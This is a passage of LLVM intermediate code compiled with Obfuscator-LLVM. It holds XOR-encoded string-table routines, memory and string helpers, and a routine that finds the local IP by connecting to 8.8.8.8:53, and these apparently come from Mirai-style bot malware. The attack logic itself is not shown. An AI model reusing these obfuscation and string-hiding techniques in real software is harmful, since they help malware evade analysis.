  %69 = xor i32 %68, %60
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %66, align 1
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i32
  %73 = load %struct.table_value*, %struct.table_value** %4, align 8
  %74 = getelementptr inbounds %struct.table_value, %struct.table_value* %73, i32 0, i32 0
  %75 = load i8*, i8** %74, align 8
  %76 = load i32, i32* %3, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = xor i32 %80, %72
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %78, align 1
  br label %83

; <label>:83:                                     ; preds = %34
  %84 = load i32, i32* %3, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %3, align 4
  br label %27

; <label>:86:                                     ; preds = %27
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strlen(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  br label %4

; <label>:4:                                      ; preds = %10, %1
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %10, label %13

; <label>:10:                                     ; preds = %4
  %11 = load i32, i32* %3, align 4
  %12 = add nsw i32 %11, 1
  store i32 %12, i32* %3, align 4
  br label %4

; <label>:13:                                     ; preds = %4
  %14 = load i32, i32* @x.81
  %15 = load i32, i32* @y.82
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  %22 = load i32, i32* %3, align 4
  %23 = load i32, i32* @x.81
  %24 = load i32, i32* @y.82
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %22

originalBBalteredBB:                              ; preds = %originalBB, %13
  %31 = load i32, i32* %3, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strcpy(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i32 @util_strlen(i8* %6)
  store i32 %7, i32* %5, align 4
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = load i32, i32* %5, align 4
  %11 = add nsw i32 %10, 1
  call void @util_memcpy(i8* %8, i8* %9, i32 %11)
  %12 = load i32, i32* %5, align 4
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define void @util_memcpy(i8*, i8*, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  br label %11

; <label>:11:                                     ; preds = %originalBBpart2, %3
  %12 = load i32, i32* %6, align 4
  %13 = add nsw i32 %12, -1
  store i32 %13, i32* %6, align 4
  %14 = icmp ne i32 %12, 0
  br i1 %14, label %15, label %37

; <label>:15:                                     ; preds = %11
  %16 = load i32, i32* @x.85
  %17 = load i32, i32* @y.86
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  %24 = load i8*, i8** %8, align 8
  %25 = getelementptr inbounds i8, i8* %24, i32 1
  store i8* %25, i8** %8, align 8
  %26 = load i8, i8* %24, align 1
  %27 = load i8*, i8** %7, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %7, align 8
  store i8 %26, i8* %27, align 1
  %29 = load i32, i32* @x.85
  %30 = load i32, i32* @y.86
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %11

; <label>:37:                                     ; preds = %11
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %15
  %38 = load i8*, i8** %8, align 8
  %39 = getelementptr inbounds i8, i8* %38, i32 1
  store i8* %39, i8** %8, align 8
  %40 = load i8, i8* %38, align 1
  %41 = load i8*, i8** %7, align 8
  %42 = getelementptr inbounds i8, i8* %41, i32 1
  store i8* %42, i8** %7, align 8
  store i8 %40, i8* %41, align 1
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @util_zero(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load i8*, i8** %3, align 8
  store i8* %6, i8** %5, align 8
  br label %7

; <label>:7:                                      ; preds = %11, %2
  %8 = load i32, i32* %4, align 4
  %9 = add nsw i32 %8, -1
  store i32 %9, i32* %4, align 4
  %10 = icmp ne i32 %8, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %7
  %12 = load i8*, i8** %5, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %5, align 8
  store i8 0, i8* %12, align 1
  br label %7

; <label>:14:                                     ; preds = %7
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_local_addr() #0 {
  %1 = load i32, i32* @x.89
  %2 = load i32, i32* @y.90
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i32, align 4
  %13 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %14 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 0, i32* %10, align 4
  store i32 16, i32* %12, align 4
  %15 = call i32* @__errno_location() #9
  store i32 0, i32* %15, align 4
  %16 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %16, i32* %10, align 4
  %17 = icmp eq i32 %16, -1
  %18 = load i32, i32* @x.89
  %19 = load i32, i32* @y.90
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %17, label %26, label %27

; <label>:26:                                     ; preds = %originalBBpart2
  store i32 0, i32* %9, align 4
  br label %51

; <label>:27:                                     ; preds = %originalBBpart2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = call i32 @htonl(i32 134744072) #9
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %31 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %30, i32 0, i32 0
  store i32 %29, i32* %31, align 4
  %32 = call zeroext i16 @htons(i16 zeroext 53) #9
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  %34 = load i32, i32* %10, align 4
  %35 = bitcast %union.__CONST_SOCKADDR_ARG* %13 to %struct.sockaddr**
  %36 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  store %struct.sockaddr* %36, %struct.sockaddr** %35, align 8
  %37 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %13, i32 0, i32 0
  %38 = load %struct.sockaddr*, %struct.sockaddr** %37, align 8
  %39 = call i32 @connect(i32 %34, %struct.sockaddr* %38, i32 16)
  %40 = load i32, i32* %10, align 4
  %41 = bitcast %union.__CONST_SOCKADDR_ARG* %14 to %struct.sockaddr**
  %42 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  store %struct.sockaddr* %42, %struct.sockaddr** %41, align 8
  %43 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %14, i32 0, i32 0
  %44 = load %struct.sockaddr*, %struct.sockaddr** %43, align 8
  %45 = call i32 @getsockname(i32 %40, %struct.sockaddr* %44, i32* %12) #6
  %46 = load i32, i32* %10, align 4
  %47 = call i32 @close(i32 %46)
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %49 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %48, i32 0, i32 0
  %50 = load i32, i32* %49, align 4
  store i32 %50, i32* %9, align 4
  br label %51

; <label>:51:                                     ; preds = %27, %26
  %52 = load i32, i32* %9, align 4
  ret i32 %52

originalBBalteredBB:                              ; preds = %originalBB, %0
  %53 = alloca i32, align 4
  %54 = alloca i32, align 4
  %55 = alloca %struct.sockaddr_in, align 4
  %56 = alloca i32, align 4
  %57 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %58 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 0, i32* %54, align 4
  store i32 16, i32* %56, align 4
  %59 = call i32* @__errno_location() #9
  store i32 0, i32* %59, align 4
  %60 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %60, i32* %54, align 4
  %61 = icmp eq i32 %60, -1
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #2

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone }
attributes #10 = { nounwind readonly }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146836174}
!2 = !{i32 -2146835765}
!3 = !{i32 -2146836302}
!4 = !{i32 -2146835893}
